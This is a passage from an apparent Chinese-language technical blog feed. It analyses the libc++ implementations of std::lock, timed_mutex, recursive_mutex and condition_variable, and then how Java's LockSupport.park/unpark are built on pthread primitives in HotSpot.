class="title">L1</span>, <span class="title">class</span> _<span class="title">L2</span>, <span class="title">class</span> ..._<span class="title">L3</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> _<span class="title">LIBCPP_INLINE_VISIBILITY</span></span></span><br><span class="line"><span class="class"><span class="title">void</span></span></span><br><span class="line"><span class="class"><span class="title">lock</span>(_<span class="title">L0</span>&amp; __<span class="title">l0</span>, _<span class="title">L1</span>&amp; __<span class="title">l1</span>, _<span class="title">L2</span>&amp; __<span class="title">l2</span>, _<span class="title">L3</span>&amp; ...__<span class="title">l3</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __lock_first(<span class="number">0</span>, __l0, __l1, __l2, __l3...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到多参数的std::lock的实现是：</p>
<ul>
<li>先获取一个锁，然后再调用std::try_lock去获取剩下的锁，如果失败了，则下次先获取上次失败的锁。</li>
<li>重复上面的过程，直到成功获取到所有的锁。</li>
</ul>
<p>上面的算法用比较巧妙的方式实现了参数的轮转。</p>
<h2 id="std-timed-mutex"><a href="#std-timed-mutex" class="headerlink" title="std::timed_mutex"></a>std::timed_mutex</h2><p>std::timed_mutex   是里面封装了mutex和condition，这样就两个函数可以用：</p>
<ul>
<li>try_lock_for</li>
<li>try_lock_until </li>
</ul>
<p>实际上是posix的mutex和condition的包装。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">timed_mutex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    mutex              __m_;</span><br><span class="line">    condition_variable __cv_;</span><br><span class="line">    <span class="keyword">bool</span>               __locked_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     timed_mutex();</span><br><span class="line">     ~timed_mutex();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    timed_mutex(<span class="keyword">const</span> timed_mutex&amp;); <span class="comment">// = delete;</span></span><br><span class="line">    timed_mutex&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> timed_mutex&amp;); <span class="comment">// = delete;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">try_lock</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>&gt;</span></span><br><span class="line"><span class="class">        _<span class="title">LIBCPP_INLINE_VISIBILITY</span></span></span><br><span class="line"><span class="class">        <span class="title">bool</span> <span class="title">try_lock_for</span>(<span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d)</span><br><span class="line">            &#123;<span class="keyword">return</span> try_lock_until(chrono::steady_clock::now() + __d);&#125;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">bool</span> <span class="title">try_lock_until</span>(<span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span></span></span><br><span class="line"><span class="class"><span class="title">timed_mutex</span>:</span>:try_lock_until(<span class="keyword">const</span> chrono::time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> chrono;</span><br><span class="line">    unique_lock&lt;mutex&gt; __lk(__m_);</span><br><span class="line">    <span class="keyword">bool</span> no_timeout = _Clock::now() &lt; <span class="keyword">__t</span>;</span><br><span class="line">    <span class="keyword">while</span> (no_timeout &amp;&amp; __locked_)</span><br><span class="line">        no_timeout = __cv_.wait_until(__lk, <span class="keyword">__t</span>) == cv_status::no_timeout;</span><br><span class="line">    <span class="keyword">if</span> (!__locked_)</span><br><span class="line">    &#123;</span><br><span class="line">        __locked_ = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="std-recursive-mutex和std-recursive-timed-mutex"><a href="#std-recursive-mutex和std-recursive-timed-mutex" class="headerlink" title="std::recursive_mutex和std::recursive_timed_mutex"></a>std::recursive_mutex和std::recursive_timed_mutex</h2><p>这两个实际上是std::mutex和std::timed_mutex 的recursive模式的实现，即锁得获得者可以重复多次调用lock()函数。</p>
<p>和posix mutex里的recursive mutex是一样的。</p>
<p>看下std::recursive_mutex的构造函数就知道了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">recursive_mutex::recursive_mutex()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">pthread_mutexattr_t</span> attr;</span><br><span class="line">    <span class="keyword">int</span> ec = pthread_mutexattr_init(&amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    ec = pthread_mutexattr_settype(&amp;attr, PTHREAD_MUTEX_RECURSIVE);</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutexattr_destroy(&amp;attr);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    ec = pthread_mutex_init(&amp;__m_, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutexattr_destroy(&amp;attr);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    ec = pthread_mutexattr_destroy(&amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_destroy(&amp;__m_);</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">fail:</span><br><span class="line">    __throw_system_error(ec, <span class="string">"recursive_mutex constructor failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="std-cv-status"><a href="#std-cv-status" class="headerlink" title="std::cv_status"></a>std::cv_status</h2><p>这个用来表示condition等待返回的状态的，和上面的三个表示lock的状态的用途差不多。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cv_status</span><br><span class="line">&#123;</span><br><span class="line">    no_timeout,</span><br><span class="line">    timeout</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="std-condition-variable"><a href="#std-condition-variable" class="headerlink" title="std::condition_variable"></a>std::condition_variable</h2><p>包装了posix condition variable。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">condition_variable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">pthread_cond_t</span> __cv_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    condition_variable() &#123;__cv_ = (<span class="keyword">pthread_cond_t</span>)PTHREAD_COND_INITIALIZER;&#125;</span><br><span class="line">    ~condition_variable();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    condition_variable(<span class="keyword">const</span> condition_variable&amp;); <span class="comment">// = delete;</span></span><br><span class="line">    condition_variable&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> condition_variable&amp;); <span class="comment">// = delete;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify_one</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify_all</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">wait</span><span class="params">(unique_lock&lt;mutex&gt;&amp; __lk)</span> _NOEXCEPT</span>;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">void</span> <span class="title">wait</span>(<span class="title">unique_lock</span>&lt;mutex&gt;&amp; __<span class="title">lk</span>, _<span class="title">Predicate</span> __<span class="title">pred</span>);</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">cv_status</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_until</span>(<span class="title">unique_lock</span>&lt;mutex&gt;&amp; __<span class="title">lk</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">bool</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_until</span>(<span class="title">unique_lock</span>&lt;mutex&gt;&amp; __<span class="title">lk</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>,</span><br><span class="line">                   _Predicate __pred);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">cv_status</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_for</span>(<span class="title">unique_lock</span>&lt;mutex&gt;&amp; __<span class="title">lk</span>,</span></span><br><span class="line"><span class="class">                 <span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">bool</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_for</span>(<span class="title">unique_lock</span>&lt;mutex&gt;&amp; __<span class="title">lk</span>,</span></span><br><span class="line"><span class="class">                 <span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d,</span><br><span class="line">                 _Predicate __pred);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">pthread_cond_t</span>* native_handle_type;</span><br><span class="line">    <span class="function">_LIBCPP_INLINE_VISIBILITY native_handle_type <span class="title">native_handle</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> &amp;__cv_;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">void</span> __do_timed_wait(unique_lock&lt;mutex&gt;&amp; __lk,</span><br><span class="line">       chrono::time_point&lt;chrono::system_clock, chrono::nanoseconds&gt;) _NOEXCEPT;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>里面的函数都是符合直觉的实现，值得注意的是：<br>cv_status是通过判断时间而确定的，如果超时的则返回cv_status::timeout，如果没有超时，则返回cv_status::no_timeout。</p>
<p>condition_variable::wait_until函数可以传入一个predicate，即一个用户自定义的判断是否符合条件的函数。这个也是很常见的模板编程的方法了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">cv_status</span></span></span><br><span class="line"><span class="class"><span class="title">condition_variable</span>:</span>:wait_until(unique_lock&lt;mutex&gt;&amp; __lk,</span><br><span class="line">                               <span class="keyword">const</span> chrono::time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> chrono;</span><br><span class="line">    wait_for(__lk, <span class="keyword">__t</span> - _Clock::now());</span><br><span class="line">    <span class="keyword">return</span> _Clock::now() &lt; <span class="keyword">__t</span> ? cv_status::no_timeout : cv_status::timeout;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span></span></span><br><span class="line"><span class="class"><span class="title">condition_variable</span>:</span>:wait_until(unique_lock&lt;mutex&gt;&amp; __lk,</span><br><span class="line">                   <span class="keyword">const</span> chrono::time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>,</span><br><span class="line">                   _Predicate __pred)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (!__pred())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (wait_until(__lk, <span class="keyword">__t</span>) == cv_status::timeout)</span><br><span class="line">            <span class="keyword">return</span> __pred();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="std-condition-variable-any"><a href="#std-condition-variable-any" class="headerlink" title="std::condition_variable_any"></a>std::condition_variable_any</h2><p>std::condition_variable_any的接口和std::condition_variable一样，不同的是 <strong><code>std::condition_variable</code>只能使用<code>std::unique_lock&lt;std::mutex&gt;</code>，而<code>std::condition_variable_any</code>可以使用任何的锁对象。</strong></p>
<p>下面来看下为什么<code>std::condition_variable_any</code>可以使用任意的锁对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">LIBCPP_TYPE_VIS</span> <span class="title">condition_variable_any</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    condition_variable __cv_;</span><br><span class="line">    <span class="built_in">shared_ptr</span>&lt;mutex&gt;  __mut_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    condition_variable_any();</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify_one</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify_all</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">void</span> <span class="title">wait</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>);</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">void</span> <span class="title">wait</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>, _<span class="title">Predicate</span> __<span class="title">pred</span>);</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>, <span class="title">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">cv_status</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_until</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>, <span class="title">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">bool</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_until</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>,</span><br><span class="line">                   _Predicate __pred);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>, <span class="title">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">cv_status</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_for</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>,</span></span><br><span class="line"><span class="class">                 <span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Lock</span>, <span class="title">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>, <span class="title">class</span> _<span class="title">Predicate</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">bool</span></span></span><br><span class="line"><span class="class">        <span class="title">wait_for</span>(_<span class="title">Lock</span>&amp; __<span class="title">lock</span>,</span></span><br><span class="line"><span class="class">                 <span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d,</span><br><span class="line">                 _Predicate __pred);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，在s<code>td::condition_variable_any</code>里，用<code>shared_ptr&lt;mutex&gt;  __mut_</code>来包装了mutex。所以一切都明白了，<strong>回顾<code>std::unique_lock&lt;std::mutex&gt;</code>，它包装了mutex，当析构时自动释放mutex。在<code>std::condition_variable_any</code>里，这份工作让<code>shared_ptr&lt;mutex&gt;</code>来做了。</strong></p>
<p>因此，也可以很轻松得出<code>std::condition_variable_any</code>会比<code>std::condition_variable</code>稍慢的结论了。</p>
<h2 id="其它的东东"><a href="#其它的东东" class="headerlink" title="其它的东东"></a>其它的东东</h2><p>sched_yield()函数的man手册：</p>
<blockquote>
<p>sched_yield() causes the calling thread to relinquish the CPU.  The thread is moved to the end of the queue for its static priority and a new thread gets to run.  </p>
</blockquote>
<p>在C++14里还有<code>std::shared_lock</code>和<code>std::shared_timed_mutex</code>，但是libc++里还没有对应的实现，因此不做分析。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>llvm libc++中的各种mutex, lock, condition variable实际上是封闭了posix里的对应实现。封装的技巧和一些细节值得细细推敲学习。</p>
<p>看完了实现源码之后，对于如何使用就更加清晰了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://en.cppreference.com/w/cpp" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp</a></li>
<li><a href="http://libcxx.llvm.org/" target="_blank" rel="noopener">http://libcxx.llvm.org/</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的LockSupport.park()实现分析</title>
    <url>/java-park/</url>
    <content><![CDATA[<h2 id="LockSupport"><a href="#LockSupport" class="headerlink" title="LockSupport"></a>LockSupport</h2><p>LockSupport类是Java6(JSR166-JUC)引入的一个类，提供了基本的线程同步原语。LockSupport实际上是调用了Unsafe类里的函数，归结到Unsafe里，只有两个函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">unpark</span><span class="params">(Thread jthread)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">park</span><span class="params">(<span class="keyword">boolean</span> isAbsolute, <span class="keyword">long</span> time)</span></span>;</span><br></pre></td></tr></table></figure>
<p>isAbsolute参数是指明时间是绝对的，还是相对的。</p>
<p>仅仅两个简单的接口，就为上层提供了强大的同步原语。</p>
<p>先来解析下两个函数是做什么的。</p>
<p>unpark函数为线程提供“许可(permit)”，线程调用park函数则等待“许可”。这个有点像信号量，但是这个“许可”是不能叠加的，“许可”是一次性的。</p>
<p>比如线程B连续调用了三次unpark函数，当线程A调用park函数就使用掉这个“许可”，如果线程A再次调用park，则进入等待状态。</p>
<p><strong>注意，unpark函数可以先于park调用。比如线程B调用unpark函数，给线程A发了一个“许可”，那么当线程A调用park时，它发现已经有“许可”了，那么它会马上再继续运行。</strong></p>
<p>实际上，park函数即使没有“许可”，有时也会无理由地返回，这点等下再解析。</p>
<h2 id="park和unpark的灵活之处"><a href="#park和unpark的灵活之处" class="headerlink" title="park和unpark的灵活之处"></a>park和unpark的灵活之处</h2><p>上面已经提到，unpark函数可以先于park调用，这个正是它们的灵活之处。</p>
<p><strong>一个线程它有可能在别的线程unPark之前，或者之后，或者同时调用了park，那么因为park的特性，它可以不用担心自己的park的时序问题，否则，如果park必须要在unpark之前，那么给编程带来很大的麻烦！！</strong></p>
<p>考虑一下，两个线程同步，要如何处理？</p>
<p>在Java5里是用wait/notify/notifyAll来同步的。wait/notify机制有个很蛋疼的地方是，比如 <strong>线程B要用notify通知线程A，那么线程B要确保线程A已经在wait调用上等待了，否则线程A可能永远都在等待。</strong> 编程的时候就会很蛋疼。</p>
<p>另外，<strong>是调用notify，还是notifyAll？</strong></p>
<p>notify只会唤醒一个线程，如果错误地有两个线程在同一个对象上wait等待，那么又悲剧了。为了安全起见，貌似只能调用notifyAll了。</p>
<p><strong>park/unpark模型真正解耦了线程之间的同步，线程之间不再需要一个Object或者其它变量来存储状态，不再需要关心对方的状态。</strong></p>
<h2 id="HotSpot里park-unpark的实现"><a href="#HotSpot里park-unpark的实现" class="headerlink" title="HotSpot里park/unpark的实现"></a>HotSpot里park/unpark的实现</h2><p>每个java线程都有一个Parker实例，Parker类是这样定义的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parker</span> :</span> <span class="keyword">public</span> os::PlatformParker &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> _counter ;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">park</span><span class="params">(<span class="keyword">bool</span> isAbsolute, jlong time)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">unpark</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlatformParker</span> :</span> <span class="keyword">public</span> CHeapObj&lt;mtInternal&gt; &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> _mutex [<span class="number">1</span>] ;</span><br><span class="line">    <span class="keyword">pthread_cond_t</span>  _cond  [<span class="number">1</span>] ;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到Parker类实际上用Posix的mutex，condition来实现的。<br>在Parker类里的_counter字段，就是用来记录所谓的“许可”的。</p>
<p>当调用park时，先尝试直接能否直接拿到“许可”，即_counter&gt;0时，如果成功，则把_counter设置为0,并返回：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Parker::park</span><span class="params">(<span class="keyword">bool</span> isAbsolute, jlong time)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Ideally we'd do something useful while spinning, such</span></span><br><span class="line">  <span class="comment">// as calling unpackTime().</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Optional fast-path check:</span></span><br><span class="line">  <span class="comment">// Return immediately if a permit is available.</span></span><br><span class="line">  <span class="comment">// We depend on Atomic::xchg() having full barrier semantics</span></span><br><span class="line">  <span class="comment">// since we are doing a lock-free update to _counter.</span></span><br><span class="line">  <span class="keyword">if</span> (Atomic::xchg(<span class="number">0</span>, &amp;_counter) &gt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
<p>如果不成功，则构造一个ThreadBlockInVM，然后检查_counter是不是&gt;0，如果是，则把_counter设置为0，unlock mutex并返回：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ThreadBlockInVM <span class="title">tbivm</span><span class="params">(jt)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (_counter &gt; <span class="number">0</span>)  &#123; <span class="comment">// no wait needed</span></span><br><span class="line">  _counter = <span class="number">0</span>;</span><br><span class="line">  status = pthread_mutex_unlock(_mutex);</span><br></pre></td></tr></table></figure>
<p>否则，再判断等待的时间，然后再调用pthread_cond_wait函数等待，如果等待返回，则把_counter设置为0，unlock mutex并返回：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (time == <span class="number">0</span>) &#123;</span><br><span class="line">  status = pthread_cond_wait (_cond, _mutex) ;</span><br><span class="line">&#125;</span><br><span class="line">_counter = <span class="number">0</span> ;</span><br><span class="line">status = pthread_mutex_unlock(_mutex) ;</span><br><span class="line">assert_status(status == <span class="number">0</span>, status, <span class="string">"invariant"</span>) ;</span><br><span class="line">OrderAccess::fence();</span><br></pre></td></tr></table></figure>
<p>当unpark时，则简单多了，直接设置_counter为1，再unlock mutext返回。如果_counter之前的值是0，则还要调用pthread_cond_signal唤醒在park中等待的线程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Parker::unpark</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s, status ;</span><br><span class="line">  status = pthread_mutex_lock(_mutex);</span><br><span class="line">  assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">  s = _counter;</span><br><span class="line">  _counter = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (s &lt; <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (WorkAroundNPTLTimedWaitHang) &#123;</span><br><span class="line">        status = pthread_cond_signal (_cond) ;</span><br><span class="line">        assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">        status = pthread_mutex_unlock(_mutex);</span><br><span class="line">        assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        status = pthread_mutex_unlock(_mutex);</span><br><span class="line">        assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">        status = pthread_cond_signal (_cond) ;</span><br><span class="line">        assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_mutex_unlock(_mutex);</span><br><span class="line">    assert (status == <span class="number">0</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简而言之，是用mutex和condition保护了一个_counter的变量，当park时，这个变量置为了0，当unpark时，这个变量置为1。</p>
<p><strong>值得注意的是在park函数里，调用pthread_cond_wait时，并没有用while来判断，所以posix condition里的”Spurious wakeup”一样会传递到上层Java的代码里。</strong></p>
<p>关于”Spurious wakeup”，参考上一篇blog：<a href="http://blog.csdn.net/hengyunabc/article/details/27969613" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/27969613</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (time == <span class="number">0</span>) &#123;</span><br><span class="line">  status = pthread_cond_wait (_cond, _mutex) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这也就是为什么Java dos里提到，当下面三种情况下park函数会返回：</p>
<ul>
<li>Some other thread invokes unpark with the current thread as the target; or</li>
<li>Some other thread interrupts the current thread; or</li>
<li><strong>The call spuriously (that is, for no reason) returns.</strong></li>
</ul>
<p>相关的实现代码在：</p>
<ul>
